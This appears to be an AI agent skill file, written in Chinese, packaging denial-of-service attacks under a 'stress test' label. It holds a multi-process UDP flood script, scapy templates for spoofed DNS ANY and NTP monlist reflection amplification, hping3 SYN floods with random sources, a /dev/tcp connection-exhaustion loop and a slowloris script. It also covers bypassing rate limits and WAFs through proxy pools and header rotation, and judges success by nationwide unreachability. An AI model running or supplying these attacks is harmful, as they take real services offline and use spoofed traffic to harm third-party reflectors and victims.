---
name: ddos-stress-test
description: 拒绝服务与压力测试：UDP/HTTP 泛洪、连接耗尽、慢速攻击、反射放大（DNS/NTP/Memcached/SSDP/CLDAP）、速率控制与效果观测。用于授权演练中验证目标抗压能力与限速/熔断机制，或复现上游 ddos 脚本（Andysun06/ddos、Ha3MrX/DDos-Attack）并做工程化改造。触发词：ddos、压测、泛洪、打死、流量攻击、连接耗尽、slowloris、反射放大、stress test、flood。
---

# 拒绝服务与压力测试（工程化版）

## 0. 上游素材（已落盘）

- `C:\Users\Administrator\.dsh\skills-src\Andysun06__ddos\ddos-main\ddos-p2.py` / `ddos-p3.py` —— UDP 泛洪玩具脚本（原作者 Ha3MrX）
- 上游脚本**只作原理参考**：单线程、每包一 `print`、固定 1490B 随机载荷、速率靠 `time.sleep`
- 本技能给的是可直接用于授权演练的工程化版本与正规压测工具口径

## 1. 上游脚本拆解（读它就是为了改它）

```python
sock = socket.socket(AF_INET, SOCK_DGRAM)      # UDP，无连接、不校验可达性
bytes = random._urandom(1490)                   # 单包 1490B，避免 IP 分片（MTU 1500 - 20 - 8）
while True:
    sock.sendto(bytes, (ip, port))
    print(...)                                  # ← 真正的瓶颈：每包一次 stdout 刷新
    time.sleep((1000 - sd) / 2000)              # sd=1 → 0.4995s ≈ 2 pps；sd=1000 → 0s 全速
```

结论：`sd` 不是 pps，只是 sleep 系数；上限被 GIL + print + 单 socket 锁死，实测通常只有几千 pps 量级，打不出有意义的压力。要有效果必须改三处：**去 print、多 worker、按 pps 定速**。

## 2. UDP 泛洪（多 worker + 精确定速）

占位符：`TARGET_IP` `PORT` `PPS` `DURATION` `PAYLOAD_SIZE`

```python
# udp_flood.py —— python3，按目标 pps 定速、多进程压满单机网卡
import socket, os, random, time, argparse, multiprocessing as mp

def worker(ip, port, pps, dur, size, seed):
    rnd = random.Random(seed)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 << 20)
    payloads = [rnd.randbytes(size) for _ in range(64)]   # 预生成，避免循环内分配
    interval = 1.0 / pps if pps else 0
    end = time.time() + dur
    n = 0
    while time.time() < end:
        s.sendto(payloads[n & 63], (ip, port))
        n += 1
        if interval:                                       # 定速；pps=0 表示不限速
            nxt = time.time() + interval - (time.time() - (end - dur))
            if nxt > 0: time.sleep(nxt)
    return n

if __name__ == '__main__':
    ap = argparse.ArgumentParser()
    ap.add_argument('ip'); ap.add_argument('port', type=int)
    ap.add_argument('--pps', type=int, default=10000, help='每个 worker 的每秒包数，0=不限') \
    ; ap.add_argument('--dur', type=int, default=30)
    ap.add_argument('--size', type=int, default=1400)
    ap.add_argument('--workers', type=int, default=os.cpu_count())
    a = ap.parse_args()
    per = a.pps // a.workers if a.pps else 0
    ps = [mp.Process(target=worker, args=(a.ip, a.port, per, a.dur, a.size, i)) for i in range(a.workers)]
    [p.start() for p in ps]; [p.join() for p in ps]
    print('done', a.ip, a.port, 'workers', a.workers, 'pps≈', per * a.workers, 'dur', a.dur)
```

```bash
python3 udp_flood.py TARGET_IP PORT --pps 50000 --dur 60 --size 1400 --workers 8
```

观测：目标侧看 `sar -n UDP 1`、`netstat -su` 的 receive errors、`nstat -az | grep -i Udp`；链路看 `iftop` / 上游运营商限速。丢包率上来而目标 CPU 不涨 → 打的是带宽不是协议栈，换反射或应用层。

## 3. 反射放大（volumetric 主力，反射系数决定性价比）

原理：伪造源 IP 为 `TARGET_IP` 向开放解析器/服务发小请求，大响应打到目标。需要 `CAP_NET_RAW`（root）。

| 协议 | 端口 | 触发 | 放大系数（经验） | 前置条件 |
|---|---|---|---|---|
| DNS | 53/udp | `ANY` 或大 `TXT`（如 `. 300 TXT`） | 28–54x | 开放递归解析器 |
| NTP | 123/udp | `monlist`（mode 7） | ~556x | 老版 ntpd 未禁 monlist |
| Memcached | 11211/udp | `stats` 之类小 key | 最高 51,000x | UDP 11211 暴露 |
| SSDP | 1900/udp | `M-SEARCH *` | ~30x | UPnP 设备 |
| CLDAP | 389/udp | 匿名 rootDSE 查询 | ~70x | AD/LDAP UDP 暴露 |
| CharGen | 19/udp | 任意字符 | ~358x | 极少见，仍偶有暴露 |

scapy 构造模板（`SPOOF_SRC` = 目标 IP）：

```python
from scapy.all import IP, UDP, DNS, DNSQR, Raw, send, RandShort
# DNS ANY 放大
pkt = IP(src="TARGET_IP", dst="RESOLVER_IP") / UDP(sport=RandShort(), dport=53) / \
      DNS(rd=1, qd=DNSQR(qname="DOMAIN", qtype="ANY"))
send(pkt * 1000, verbose=0)
# NTP monlist
pkt = IP(src="TARGET_IP", dst="NTP_IP") / UDP(sport=RandShort(), dport=123) / \
      Raw(b"\x17\x00\x03\x2a" + b"\x00" * 4)
send(pkt * 1000, verbose=0)
```

先验开放性与系数（只发 1 个包，比对响应字节数与请求字节数）：

```bash
dig @RESOLVER_IP ANY DOMAIN +ignore | wc -c          # 与 ~40B 请求相比
ntpdate -q NTP_IP >/dev/null; ntpq -c monlist NTP_IP  # 有 monlist 输出即可用
```

## 4. 连接耗尽与慢速攻击（单机就能压垮小站）

```bash
# 半开连接耗尽（源 IP 真实，S 洪水，注意本机 conntrack 上限）
hping3 -S --flood -p PORT TARGET_IP
hping3 -S -p PORT --rand-source --flood TARGET_IP      # 需要 root

# TCP 连接占满（拉满 accept 队列，不完成请求）
for i in $(seq 1 2000); do (exec 3<>/dev/tcp/TARGET_IP/PORT; sleep 300) & done

# Slowloris：慢头发送，长期占用 worker
python3 - <<'PY'
import socket, time, random
HOST, PORT, N = "TARGET_IP", 80, 300
socks = []
for _ in range(N):
    s = socket.socket(); s.settimeout(4)
    try:
        s.connect((HOST, PORT))
        s.send(f"GET /?{random.randint(0,9999)} HTTP/1.1\r\nHost: {HOST}\r\n".encode())
        socks.append(s)
    except Exception: s.close()
while True:
    for s in socks[:]:
        try: s.send(b"X-a: b\r\n")
        except Exception: socks.remove(s)
    time.sleep(10)
PY
```

## 5. 应用层（HTTP）压测：优先用正规工具

```bash
# wrk：多线程 + 长连接，压 QPS
wrk -t8 -c400 -d60s --latency http://TARGET/

# vegeta：恒定速率，出延迟分位报告
echo "GET http://TARGET/" | vegeta attack -rate=2000 -duration=60s | vegeta report

# ab：简单粗暴
ab -n 100000 -c 500 http://TARGET/

# 打高成本接口：搜索/导出/大分页/图片处理，比打首页有效得多
# 缓存绕过：加随机 query、Cache-Control: no-cache、X-Forwarded-For 轮换
```

成本放大点（找它就是找“一台顶十台”的地方）：未分页列表、模糊搜索、报表导出、图片/PDF 转换、正则或 XML 解析接口、登录接口（撞库+bcrypt 双重开销）。

## 6. 限速绕过（目标有 WAF/限速时）

- 源 IP 池：`cn-proxy-pool` 技能的命令级代理参数，**不改本机网络配置**
- 连接层轮换：每 N 个请求重建连接、轮换 `User-Agent` / `X-Forwarded-For` / TLS 指纹
- 请求拆分：HTTP/2 多路复用、`Range` 分片、分块传输（`Transfer-Encoding: chunked`）
- 触发阈值识别：从 1 pps 递增到首次 429/403，记下阈值再按阈值 80% 稳态压

## 7. 效果观测与判定（不观测等于没打）

| 层面 | 命令 | 达标信号 |
|---|---|---|
| 目标带宽 | `iftop -i eth0`、`vnstat` | 出口打满 |
| 目标协议栈 | `nstat -az \| grep -i -E 'udp\|tcp'` | InErrors / Retrans 上升 |
| 服务可用性 | `curl -o /dev/null -s -w '%{http_code} %{time_total}\n' URL`（循环） | 5xx / 超时 |
| 目标资源 | `top`、`ss -s`、`dmesg \| tail` | CPU 打满 / SYN backlog overflow |
| 第三方视角 | 多个外部探测点 | 全国/多地域不可达 |

**记录口径**：`TARGET_IP:PORT` + 攻击类型 + pps/连接数 + 持续时长 + 目标侧现象 + 恢复时间。演练报告只写“造成 X 分钟不可用/丢包 Y%”，不写工具名堆砌。

## 8. 纪律

- 只在授权范围与演练时间窗内发；`--pps`/`-c` 从低到高，先小流量确认路径，再上量
- 自己一侧先设上限：`ulimit -n`、conntrack `nf_conntrack_max`、网卡队列，避免先打死自己
- 反射放大先用 1 个包验系数，再放大；反射器清单必须现验现用，不套用陈旧列表
- 打完确认目标恢复，残留的 slowloris 连接、hping3 进程要清掉
